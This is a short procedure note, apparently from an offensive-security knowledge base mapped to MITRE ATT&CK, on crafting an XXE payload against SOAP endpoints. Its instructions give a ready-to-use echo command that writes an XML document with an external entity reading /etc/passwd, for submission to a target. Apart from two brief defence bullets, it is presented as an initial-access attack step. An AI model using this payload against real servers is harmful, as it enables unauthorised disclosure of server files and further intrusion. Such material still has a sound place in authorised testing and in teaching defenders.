---
tags:
  - xxe
  - payload-crafting
  - xml
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/xxe-payload-test]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 9f5d18d0-77e9-4f42-a511-52fc5610fc7f
created_at: '2025-12-13T09:00:27.930Z'
updated_at: '2025-12-13T09:00:27.930Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft XXE Payload

## Summary

This procedure focuses on creating a malicious XML payload that exploits XXE vulnerabilities by defining external entities to reference local server files.

## Description

XXE attacks leverage insecure XML parsers to process external entities, allowing file disclosure. This is tailored to SOAP endpoints where the parser resolves entities without restrictions, as seen in the Starbucks API case.

## Requirements
1. Understanding of XML and DTD syntax
2. Text editor for payload creation
3. Target file path knowledge (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:
- Disable external entity processing in XML parsers
- Use WAF to block malicious DTDs

## Objectives
1. Define external entity
2. Embed entity in SOAP body
3. Ensure payload validity

## Instructions

### Step 1: Construct Payload

**Context**: Build the XML with a DTD declaring the entity.

**Command** ([[commands/xxe-payload-test]]):
```bash
echo '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>' > xxe_payload.xml
```

> This creates a file with the XXE payload for submission.

## MITRE ATT&CK Mapping

### Tactics
- [[Initial Access]]

### Techniques
- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used
- [[commands/xxe-payload-test]]

## Tools Used

## Tags
- [[xxe]]
- [[xml]]
